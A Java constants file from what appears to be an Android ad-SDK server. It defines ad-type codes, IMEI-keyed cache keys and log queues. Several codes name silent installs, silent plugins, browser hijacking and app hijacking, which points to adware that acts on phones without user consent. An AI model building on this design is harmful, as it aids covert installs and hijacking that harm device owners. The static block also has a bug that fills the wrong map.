package com.kokmobi.server.commons;

import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class Constants {

	public static final int MAX_ADS = 10;
	public static final int STATUS_YES = 3200;
	public static final int STATUS_NO = 3201;
	public static final int APKTYPE_COMMON = 8200500;
	public static final int APKTYPE_SILENCE = 8200501;
	
	public static final int ADTYPE_PUSH = 600500;		//推送
	public static final int ADTYPE_POP = 600506;		//插屏
	public static final int ADTYPE_SILENCE = 600501;	//静默
	public static final int ADTYPE_GUIDE = 600509;		//引导
	public static final int ADTYPE_DOWN = 600508;		//下沉

	public static final int ADTYPE_SUBSCRIBE = 600300;   //订阅
	
	public static final int SDKSTYLE_SDK = 600400;		// sdk
	public static final int SDKSTYLE_GUIDE = 600403;	// guide
	public static final int SDKSTYLE_DOWN = 600404;		// down
	public static final int SDKSTYLE_SILENCE = 600405;	// silence
	public static final int SDKSTYLE_WEB = 600406;	// web
	public static final int SDKSTYLE_OFFLINE = 600407;	// offline

	public static final int OFFERSDK_PUSH = 600601;	// push
	public static final int OFFERSDK_PLAQUE = 600602;	// 插屏
	public static final int OFFERSDK_BROWSER = 600603;	// 浏览器劫持
	public static final int OFFERSDK_APPHOLD = 600604;	// APP劫持
	public static final int OFFERSDK_LEVITATE = 600605;	// 浮标
	public static final int OFFERSDK_CREATEICONA= 600606;	// 图标推广
	public static final int OFFERSDK_CREATEICONB= 600607;	// 图标下载
	public static final int OFFERSDK_UPLEVEL = 600608;	// 升级

	public static final Map<Integer, Integer> statusMap;
	public static final Map<Integer, Integer> apkTypeMap;
	
	public static final String KEY_IP_COUNTRY = "ip:%s";	//
	public static final int KEY_IP_COUNTRY_EXPIRE = 24 * 60 * 60;

	public static final String KEY_USER_INFO = "users:%s:%s:info";	//销量用户缓存{0}为SdkStyple，{1}为imei
	public static final int KEY_USER_INFO_EXPIRE = 24 * 60 * 60;
	public static final String KEY_PROJECT_USER_INFO = "project:%s:users:%s:%s:info";	//项目销量用户缓存0:projectId,{1}为SdkStyple，{2}为imei
	public static final int KEY_PROJECT_USER_INFO_EXPIRE = 24 * 60 * 60;
	public static final String KEY_WHITELIST_USER = "whitelist:ddl:%s";	//ddl销量白名单
	/**
	 * //广告下发黑名单{0}=imei	
	 */
	public static final int KEY_BLACKLIST_USER_EXPIRE = 24 * 60 * 60;

	public static final String KEY_BLACKLIST_USER = "blacklist:ddl:%s";

	public static final String KEY_ACT_USER_INFO = "actusers:%s:%s:info";		//总活跃-单数据%s=cdate,{1}=imei
	public static final int KEY_ACT_USER_INFO_EXPIRE = 24 * 60 * 60;
	/**
	 * 单活跃用户数据信息
	 * //0date,1sdkStyle,2projectid,3channelid,4plugid,5country,6countrylevel,7imei
	 */
	public static final String KEY_ACT_USER_GROUP_INFO = "actusers:%s:%s:%s:%s:%s:%s:%s:%s:group";
	public static final int KEY_ACT_USER_GROUP_INFO_EXPIRE = 24 * 60 * 60;

	public static final String KEY_PROJECT_INFO = "projects:%s:info";				//项目的基本信息
	public static final int KEY_PROJECT_INFO_EXPIRE = 60*10;

	public static final String KEY_PROJECT_ADSETTING = "projects:%s:adsetting";	//项目的广告下发配置信息
	public static final int KEY_PROJECT_ADSETTING_EXPIRE = 60*10;

	public static final String KEY_SILENT_SETTING = "slient:setting:%s";			//%s=sdkVersion，静默的按版本配置信息
	public static final int KEY_SILENT_SETTING_EXPIRE = 60*60*24;

	public static final String KEY_CURRENT_PLUGINFO = "plugin:info";	//当前最新的插件信息
	public static final int KEY_CURRENT_PLUGINFO_EXPIRE = 60*10;

	public static final String KEY_ADJUST_KEY = "adjust:key:%s";	//当前最新的adjust key{0}=channel
	public static final int KEY_ADJUST_KEY_EXPIRE = 60 * 60 * 24;
	/**
	 * //国家等级（某天某个产品某个国家的等级）
	 * {0}projectId{1}countryId{2}date
	 */
	public static final String KEY_COUNTRY_LEVEL = "cou:%s:%s:%s:level";
	public static final int KEY_COUNTRY_LEVEL_EXPIRE = 24 * 60 * 60;

	public static final String KEY_ADLIST = "ad:haslist";	//保存当前的广告列表

	public static final String KEY_AD = "ad:id:%s";
	public static final String KEY_IFRAME = "ad:iframe:%s";
	/**
	 * 记录广告下发过列表
	 * {0}imei，{1}广告类型,{2}插件类型
	 */
	public static final String KEY_AD_SENTIST = "ad:list:%s:%s:%s";
	public static final int KEY_AD_SENTIST_EXPIRE = 24 * 60 * 60;

	/**
	 * 记录订阅下发过列表
	 * {0}imei，{1}渠道
	 */
	public static final String KEY_SUB_SENTIST = "sub:list:%s:%s";
	public static final int KEY_SUB_SENTIST_EXPIRE = 24 * 60 * 60;

	/**
	 * 记录电商广告下发过列表
	 * {0}imei，{1}广告类型,{2}插件类型
	 */
	public static final String KEY_DSAD_SENTIST = "ad:list:%s:%s";
	public static final int KEY_DSAD_SENTIST_EXPIRE = 24 * 60 * 60;

	/**
	 * 记录WEb广告下发过列表
	 * {0}imei，{1}广告类型,{2}插件类型
	 */
	public static final String KEY_WEBAD_SENTIST = "webad:list:%s:%s";
	public static final int KEY_WEBAD_SENTIST_EXPIRE = 24 * 60 * 60;

	/**
	  电商回传
	 */
	public static final String KEY_ONLINE= "onlinead:list:%s:%s";
	public static final int KEY_ONLINE_EXPIRE = 24 * 60 * 60;

	/**
	 * 订阅SKD回传
	 */
	public static final String KEY_ONLINESDK = "onlinesdk:list:%s:%s";
	public static final int KEY_ONLINESDK_EXPIRE = 24 * 60 * 60;
	/**
	 * 聚合订阅激活回传
	 */
	public static final String KEY_ACTIVE="active:list:%s:%s";
	public static final int KEY_ACTIVE_EXPIRE = 24 * 60 * 60;

	public static final String KEY_PROMOTION = "promotion%s";
	public static final String KEY_PROMOTION_IFRAME = "promotioniframe_%s";
	/**
	 * 记录上次下发列表的时间--
	 * {0}imei：{1}插件类型：{2}项目id
	 */
	public static final String KEY_AD_LAST_SENT = "ad:lastsent:%s:%s:%s";
	public static final int KEY_AD_LAST_SENT_EXPIRE = 60 * 60 * 1;
	/** 规定时间发送广告的次数 */
	public static final int KEY_AD_LAST_SENT_NUM = 20;
	/**
	 * 存储广告基本信息{0}=apkId
	 */
	public static final String KEY_AD_INFO = "ad:%s:info";		
	/**
	 * sent package {0}=pkgId
	 */
	public static final String KEY_AD_SENT_PACKAGE = "ad:pkg:%s";
	public static final int KEY_AD_SENT_PACKAGE_EXPIRE = 60 * 60 * 24;
	
	
	/**
	 * 展示
	 */
	public static final String KEY_AD_SHOW = "ad:show:%s:%s";
	public static final int KEY_AD_SHOW_EXPIRE = 60 * 60 * 24;
	
	
	/**
	 * 点击
	 */
	public static final String KEY_AD_CLICK = "ad:click:%s:%s";
	public static final int KEY_AD_CLICK_EXPIRE = 60 * 60 * 24;
	
	/**
	 *下载
	 */
	public static final String KEY_AD_DOWNLOAD = "ad:download:%s:%s";
	public static final int KEY_AD_DOWNLOAD_EXPIRE = 60 * 60 * 24;
	
	/**
	 * 安装数排重
	 */
	public static final String KEY_AD_INSTALL = "ad:install:%s:%s";
	public static final int KEY_AD_INSTALL_EXPIRE = 60 * 60 * 24;
	
	
	/**
	 * 安装数排重
	 */
	public static final String KEY_AD_ACTIVATE = "ad:activate:%s:%s";
	public static final int KEY_AD_ACTIVATE_EXPIRE = 60 * 60 * 24;

	/**
	 * 回传次数
	 */
	public static final String KEY_BACK_COUNT = "ad:backcount:%s";
	public static final int KEY_BACK_COUNT_EXPIRE = 60 * 60 * 4;

	/**
	 * 广告对应的语言
	 * d:lan:{0}apkid:{1}language
	 */
	public static final String KEY_AD_LANGUAGE_INFO = "ad:lan:%s:%s";

	/**
	 * 保存已处理的日志包信息
	 */
	public static final String KEY_LOG_PKG_INFO = "log:pkg:%s";
	public static final int KEY_LOG_PKG_INFO_EXPIRE = 60 * 60 * 24 ;

	//To Save Key...
	public static final String KEY_USER_LIST_TOSAVE = "user_info";			//销量列表--待保存数据
	public static final String KEY_PROJECT_USER_LIST_TOSAVE = "user_info_project";			//xiangmu销量列表--待保存数据
	public static final String KEY_ACT_USER_LIST_TOSAVE = "user_active";		//总活跃-待保存列表

	/**
	 * /扔给流服务器保存，广告下发列表
	 */
	public static final String KEY_AD_SENTLIST_TOSAVE = "ad_send_data";/**

	 /**
	 * /扔给流服务器保存，订阅SDK广告下发列表
	 */
	public static final String OFFER_SDK_SENTLIST_TOSAVE = "offersdk_send_data";/**

	 * /扔给流服务器保存，电商广告下发列表
	 */
	public static final String KEY_DSAD_SENTLIST_TOSAVE = "ad_dssend_data";

	/**
	 * 放弃该请求跳转URL
	 */
	public static final String LOSE_REQUEST_REDIRECT_URL = "http://www.google.com";
	/**
	 * /扔给流服务器保存，广告下发反馈列表
	 */
	public static final String KEY_AD_SENTBACK_TOSAVE = "ad_send_succ_data";
	public static final String KEY_LOG_SHOW_TOSAVE = "ad_show_data";			//日志数据-展示
	public static final String KEY_LOG_CLICK_TOSAVE ="ad_click_data";			//日志数据-点击
	public static final String KEY_LOG_DOWNLOAD_TOSAVE ="ad_download_data";		//日志数据-下载
	public static final String KEY_LOG_INSTALLED_TOSAVE ="ad_installed_data";	//日志数据-安装
	public static final String KEY_LOG_ACTIVATE_TOSAVE ="ad_activate_data";		//日志数据-激活
	public static final String KEY_AD_LINK_TOSAVE ="ad_link_data";        //WEb日志数据-点击
	public static final String KEY_AD_DSSDK_TOSAVE ="ad_dssdk_data";        //WEb日志数据-点击
	public static final String KEY_AD_ACTIVE_TOSAVE = "ad_active_data";    //订阅激活数据
	public static final String KEY_OFFERSDK_ACTIVE_TOSAVE = "offersdk_active_data";    //订阅SDK激活数据
	public static final String KEY_SUB_CLICK_TOSAVE = "sub_click_data";    //日志数据-订阅
	public static final String KEY_SUB_LINK_TOSAVE = "sub_link_data";    //外放链接数据-订阅
	public static final String KEY_OFFER_SDK_TOSAVE = "offer_sdk_data";    //订阅SDK数据
//	public static final String USER_INFO ="user_info";
//	public static final String USER_ACTIVE ="user_active";
//	public static final String AD_SEND_DATA ="ad_send_data";
//	public static final String AD_SEND_SUCC_DATA ="ad_send_succ_data";
//	public static final String AD_SHOW_DATA ="ad_show_data";
//	public static final String AD_CLICK_DATA ="ad_click_data";
//	public static final String AD_DOWNLOAD_DATA ="ad_download_data";
//	public static final String AD_INSTALLED_DATA ="ad_installed_data";
//	public static final String AD_ACTIVATE_DATA ="ad_activate_data";


	public static final String BASE_IMAGE_URL_PATH = "http://app.cdn8face.com";//"http://koksdk.b0.upaiyun.com/";	//图片下载地址
	public static final String BASE_APK_URL_PATH = "http://app.cdn8face.com";// "http://koksdk.b0.upaiyun.com/";		//广告apk下载地址
	public static final int LEVEL_NONE = 4;	//无效等级

	public static final String KEY_SILENT_PLUGIN_INFO = "silent_plugin_info"; //所有静默插件信息

	public static final int KEY_SILENT_PLUGIN_INFO_EXPIRE = 60*10;

	public static final String KEY_LINKAD_URL = "link_ad_url"; //所有链接广告的调转的url
	public static final int KEY_LINKAD_URL_EXPIRE = 60 * 60 * 24;
	//当天没有广告的imei
	public static final String ISNOT_AD = "isnot_ad:%s"; //所有链接广告的调转的url
	public static final int ISNOT_AD_EXPIRE = 60 * 60 * 24;
	//web域名
	public static final String WEB_WWW = "webwww";	//保存当前的广告列表
	//web域名
	public static final String PCKAGENAME = "packageName";	//保存当前的广告列表

	public static final String KEY_OPER = "oper:%s"; //运营商code对应id;

	public static final String OFFLINETIMESTEP = "offlinetimestep";
	public static final String OFFLINEJAR = "offlinejar";
	public static final String OFFLINEAPK = "offlineapk";
	public static final String PLATFORM = "platform";
	public static final String KEY_OFFER = "offer:%s";


	static {
		statusMap = new HashMap<Integer, Integer>();
		statusMap.put(STATUS_YES, 1);
		statusMap.put(STATUS_NO, 0);
		apkTypeMap = new HashMap<Integer, Integer>();
		statusMap.put(APKTYPE_COMMON, 0);
		statusMap.put(APKTYPE_SILENCE, 1);
	}
}
